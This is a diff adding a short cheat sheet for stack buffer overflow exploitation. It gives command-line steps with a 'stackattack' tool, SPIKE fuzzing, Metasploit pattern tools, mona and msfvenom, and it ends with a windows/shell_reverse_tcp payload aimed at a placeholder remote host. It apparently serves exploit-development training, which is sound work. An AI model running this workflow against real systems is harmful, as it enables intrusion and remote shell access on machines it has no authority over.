@@ -1,0 +1,44 @@
+# Buffer Overflow exploitation
+stackattack
+
+# 1. Determine approximatives lenght of overflow trigger w/ binary search "A"x1000
+stackattack -f -t <RHOST> -p <RPORT> -s 100 -i 100
+# or
+generic_send_tcp <RHOST> <RPORT> <spike_sckipt> SKIPVAR SLIPSTR
+# Spike Script.spk
+# s_readline();
+# s_string("Stats ");
+# s_string_variable("0);
+
+# 2. Determine exact EIP with pattern_create.rb & pattern_offset.rb
+stackattack -P -t <RHOST> -p <RPORT> -s <#1 + 500>
+# or
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <#1 + 500>
+# Look at the crash EIP address and enter it below to get the offset
+stackattack -o -s <#1 + 500> 
+# or
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l <#1 + 500> -q <EIP>
+
+# 3. Validate EIP controle and look for 42424242 in the EIP
+stackattack -e -t <RHOST> -p <RPORT> -s <offset>
+
+# 4. Look for  badchars in debugger (clic ESP and Follow in dump) ex: "\x00" ** Capitalized HEX 
+stackattack -b -t <RHOST> -p <RPORT> -s <offset>
+
+# 5. Dev exploit
+# Find JMP ESP or CALL ESP Hex Value
+/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
+# Find injectable module with mona
+!mona modules
+# Find memory address (Flip the address ex: 11223344 = 44332211)
+!mona find -s '\xff\xe4' -m <Module name> 
+# set a breakpoint to the address found and test it below
+stackattack -j -t <RHOST> -p <RPORT> -s <offset>
+
+# 6 test with calc
+stackattack -C -t <RHOST> -p <RPORT> -s <offset> -n <nops>
+
+# 7. msfvenom shellcode
+stackattack -S -t <RHOST> -p <RPORT> -s <offset> -n <nops>
+payload = windows/shell_reverse_tcp
+
